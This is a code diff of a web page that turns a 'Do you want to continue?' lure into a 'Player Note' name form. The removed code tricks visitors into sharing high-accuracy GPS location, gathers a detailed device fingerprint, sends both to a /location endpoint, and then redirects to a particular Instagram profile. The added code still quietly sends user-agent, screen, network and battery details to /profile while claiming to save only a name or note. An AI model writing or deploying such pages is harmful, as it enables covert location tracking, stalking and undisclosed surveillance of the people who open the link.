@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Continue</title>
+  <title>Player Note</title>
   <style>
     :root {
       --bg-1: #f3efe6;
@@ -36,7 +36,7 @@
     }
 
     .card {
-      width: min(100%, 420px);
+      width: min(100%, 440px);
       padding: 34px 28px;
       border: 1px solid var(--border);
       border-radius: 24px;
@@ -52,6 +52,30 @@
       text-align: center;
     }
 
+    p {
+      margin: 14px 0 0;
+      text-align: center;
+      color: var(--muted);
+      line-height: 1.6;
+    }
+
+    label {
+      display: block;
+      margin-top: 22px;
+      margin-bottom: 8px;
+      font-weight: 700;
+    }
+
+    input {
+      width: 100%;
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 14px 16px;
+      font-size: 1rem;
+      color: var(--text);
+      background: rgba(255, 255, 255, 0.95);
+    }
+
     .actions {
       display: flex;
       gap: 12px;
@@ -60,7 +84,8 @@
       justify-content: center;
     }
 
-    button {
+    button,
+    a {
       border: 0;
       border-radius: 999px;
       padding: 14px 22px;
@@ -68,9 +93,14 @@
       font-weight: 700;
       cursor: pointer;
       transition: transform 0.18s ease, opacity 0.18s ease, background 0.18s ease;
+      text-decoration: none;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
     }
 
-    button:hover {
+    button:hover,
+    a:hover {
       transform: translateY(-1px);
     }
 
@@ -99,72 +129,44 @@
       margin-top: 14px;
       text-align: center;
       color: var(--muted);
+      font-weight: 600;
     }
   </style>
 </head>
 <body>
   <main class="card">
-    <h1>Do you want to continue?</h1>
+    <h1>Add your name or note</h1>
+    <p>This will be saved to the current logs before you continue.</p>
+
+    <label for="playerInput">Name or note</label>
+    <input id="playerInput" name="playerInput" type="text" maxlength="40" placeholder="Type here">
 
     <div class="actions">
-      <button class="primary" id="continueBtn" type="button">Continue</button>
-      <button class="secondary" id="cancelBtn" type="button">Cancel</button>
+      <button class="primary" id="saveBtn" type="button">Save and Continue</button>
+      <a class="secondary" href="/continue.html">Skip</a>
     </div>
 
     <div class="hint" id="statusText" aria-live="polite"></div>
   </main>
 
   <script>
-    const continueBtn = document.getElementById("continueBtn");
-    const cancelBtn = document.getElementById("cancelBtn");
+    const playerInput = document.getElementById("playerInput");
+    const saveBtn = document.getElementById("saveBtn");
     const statusText = document.getElementById("statusText");
-    const targetUrl = "https://www.instagram.com/richeee.x/";
 
     function setBusy(isBusy) {
-      continueBtn.disabled = isBusy;
-      cancelBtn.disabled = isBusy;
+      saveBtn.disabled = isBusy;
     }
 
     function setStatus(message) {
       statusText.textContent = message;
-      statusText.className = "hint";
-    }
-
-    function openInstagram() {
-      window.location.href = targetUrl;
-    }
-
-    async function sendLocationToServer(payload) {
-      const body = JSON.stringify(payload);
-
-      if (navigator.sendBeacon) {
-        const blob = new Blob([body], { type: "application/json" });
-        const queued = navigator.sendBeacon("/location", blob);
-        if (queued) {
-          return;
-        }
-      }
-
-      const response = await fetch("/location", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body,
-        keepalive: true
-      });
-
-      if (!response.ok) {
-        throw new Error("Failed to send location to the server.");
-      }
     }
 
     async function collectBatteryDetails() {
       if (!navigator.getBattery) {
         return {
           level: "-",
-          charging: "-",
-          saveMode: "-"
+          charging: "-"
         };
       }
 
@@ -172,50 +174,18 @@
         const battery = await navigator.getBattery();
         return {
           level: `${Math.round((battery.level || 0) * 100)}%`,
-          charging: battery.charging,
-          saveMode: "-"
+          charging: battery.charging
         };
       } catch (error) {
         return {
           level: "-",
-          charging: "-",
-          saveMode: "-"
+          charging: "-"
         };
       }
     }
 
-    function collectNetworkDetails() {
+    function collectSnapshot() {
       const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-      const ua = navigator.userAgent || "";
-      const uaData = navigator.userAgentData || null;
-
-      function detectBrowser() {
-        if (/edg/i.test(ua)) return "Microsoft Edge";
-        if (/opr|opera/i.test(ua)) return "Opera";
-        if (/chrome|chromium|crios/i.test(ua) && !/edg|opr|opera/i.test(ua)) return "Chrome";
-        if (/firefox|fxios/i.test(ua)) return "Firefox";
-        if (/safari/i.test(ua) && !/chrome|chromium|crios|edg|opr|opera/i.test(ua)) return "Safari";
-        return "Unknown";
-      }
-
-      function detectOS() {
-        if (/windows nt/i.test(ua)) return "Windows";
-        if (/android/i.test(ua)) return "Android";
-        if (/iphone|ipad|ipod/i.test(ua)) return "iOS";
-        if (/mac os x/i.test(ua)) return "macOS";
-        if (/linux/i.test(ua)) return "Linux";
-        return "Unknown";
-      }
-
-      function detectDeviceType() {
-        if (uaData && typeof uaData.mobile === "boolean") {
-          return uaData.mobile ? "mobile" : "desktop";
-        }
-        if (/tablet|ipad/i.test(ua)) return "tablet";
-        if (/mobi|android|iphone|ipod/i.test(ua)) return "mobile";
-        return "desktop";
-      }
-
       return {
         userAgent: navigator.userAgent || "",
         platform: navigator.platform || "",
@@ -236,148 +206,59 @@
           pixelRatio: window.devicePixelRatio || null,
           orientation: window.screen?.orientation?.type || ""
         },
-        device: {
-          type: detectDeviceType(),
-          browser: detectBrowser(),
-          os: detectOS(),
-          touchPoints: navigator.maxTouchPoints ?? 0,
-          vendor: navigator.vendor || "",
-          userAgentBrands: uaData?.brands || [],
-          mobile: uaData?.mobile ?? null
-        },
         connection: connection ? {
           effectiveType: connection.effectiveType || "",
           downlink: connection.downlink ?? null,
-          downlinkMax: connection.downlinkMax ?? null,
           rtt: connection.rtt ?? null,
           saveData: connection.saveData ?? null,
           type: connection.type || ""
-        } : null,
-        secureContext: window.isSecureContext,
-        referrer: document.referrer || ""
+        } : null
       };
     }
 
-    async function buildSnapshot() {
-      const snapshot = collectNetworkDetails();
+    async function sendProfileInput() {
+      const snapshot = collectSnapshot();
       snapshot.battery = await collectBatteryDetails();
-      return snapshot;
+
+      const response = await fetch("/profile", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          label: "Player Input",
+          value: playerInput.value.trim(),
+          timestamp: new Date().toISOString(),
+          page: window.location.href,
+          snapshot
+        })
+      });
+
+      if (!response.ok) {
+        throw new Error("Failed to send profile input.");
+      }
     }
 
-    function requestLocation() {
-      if (!("geolocation" in navigator)) {
-        setStatus("Geolocation is not supported in this browser.");
+    saveBtn.addEventListener("click", async () => {
+      const value = playerInput.value.trim();
+      if (!value) {
+        playerInput.focus();
+        setStatus("Enter a name or note first.");
         return;
       }
 
       setBusy(true);
-      setStatus("Waiting for permission...");
+      setStatus("Saving...");
 
-      let bestPosition = null;
-      let watchId = null;
-      let finished = false;
-
-      function finishWithMessage(message) {
-        if (watchId !== null) {
-          navigator.geolocation.clearWatch(watchId);
-        }
-        finished = true;
+      try {
+        await sendProfileInput();
+        setStatus("Saved. Opening...");
+        window.location.href = "/continue.html";
+      } catch (error) {
+        setStatus("Could not save. Please try again.");
+      } finally {
         setBusy(false);
-        setStatus(message);
       }
-
-      async function finishWithPosition(position) {
-        if (finished) {
-          return;
-        }
-
-        finished = true;
-        if (watchId !== null) {
-          navigator.geolocation.clearWatch(watchId);
-        }
-
-        const { latitude, longitude, accuracy } = position.coords;
-        const payload = {
-          latitude,
-          longitude,
-          accuracy,
-          timestamp: new Date().toISOString(),
-          network: await buildSnapshot()
-        };
-
-        setStatus("Opening...");
-        sendLocationToServer(payload).catch(() => {
-        });
-        setBusy(false);
-        window.location.href = targetUrl;
-      }
-
-      function handlePosition(position) {
-        if (!bestPosition || position.coords.accuracy < bestPosition.coords.accuracy) {
-          bestPosition = position;
-        }
-
-        if (position.coords.accuracy <= 30) {
-          finishWithPosition(position);
-        }
-      }
-
-      function handleError(error) {
-        if (finished) {
-          return;
-        }
-
-        if (bestPosition) {
-          finishWithPosition(bestPosition);
-          return;
-        }
-
-        if (error.code === error.PERMISSION_DENIED) {
-          finishWithMessage("Location is blocked in your browser. Tap the site icon near the address bar, allow Location for this site, then try again.");
-          return;
-        }
-
-        if (error.code === error.POSITION_UNAVAILABLE) {
-          finishWithMessage("Location is unavailable right now.");
-          return;
-        }
-
-        if (error.code === error.TIMEOUT) {
-          finishWithMessage("Request timed out. Please try again.");
-          return;
-        }
-
-        finishWithMessage("Location request was not completed.");
-      }
-
-      watchId = navigator.geolocation.watchPosition(
-        handlePosition,
-        handleError,
-        {
-          enableHighAccuracy: true,
-          timeout: 15000,
-          maximumAge: 0
-        }
-      );
-
-      setTimeout(() => {
-        if (finished) {
-          return;
-        }
-
-        if (bestPosition) {
-          finishWithPosition(bestPosition);
-          return;
-        }
-
-        finishWithMessage("Could not get a reliable location. Please try again outdoors or with GPS/Wi-Fi on.");
-      }, 8000);
-    }
-
-    continueBtn.addEventListener("click", requestLocation);
-
-    cancelBtn.addEventListener("click", () => {
-      setStatus("Cancelled.");
     });
   </script>
 </body>
